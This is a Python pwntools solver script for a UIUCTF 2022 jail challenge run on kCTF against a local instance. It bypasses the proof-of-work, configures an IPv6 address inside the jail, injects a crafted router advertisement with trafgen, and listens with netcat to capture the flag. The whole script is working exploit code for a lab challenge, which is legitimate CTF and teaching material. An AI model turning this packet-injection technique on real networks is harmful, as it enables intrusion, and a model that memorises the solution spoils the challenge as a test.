#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes


def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


print(r.recvuntil(b'uiuctf-2022:/#'))
r.sendline(b'cd /tmp')

print(r.recvuntil(b'uiuctf-2022:/tmp#'))
r.sendline(b'ip -6 addr add 2001:db8:6e02:2663:48c5:2dff:fe9b:8c8d '
           b'dev jail_if nodad')

print(r.recvuntil(b'uiuctf-2022:/tmp#'))
r.sendline(b"cat > ra.trafgen << 'EOF'")
with open('/home/user/ra.trafgen', 'rb') as f:
    r.send(f.read())
r.sendline(b'EOF')

print(r.recvuntil(b'uiuctf-2022:/tmp#'))
# We need to wait for DAD timeout before we send RA. It's something like
# 2 seconds but we can wait 5 to be safe
r.sendline(b'sleep 5; trafgen -d jail_if -c ra.trafgen -n 1')

print(r.recvuntil(b'uiuctf-2022:/tmp#'))
r.sendline(b'nc -6ul 16611')

print(r.recvuntil((b'CTF{', b'uiuctf{')))
print(r.recvuntil((b'}')))

exit(0)
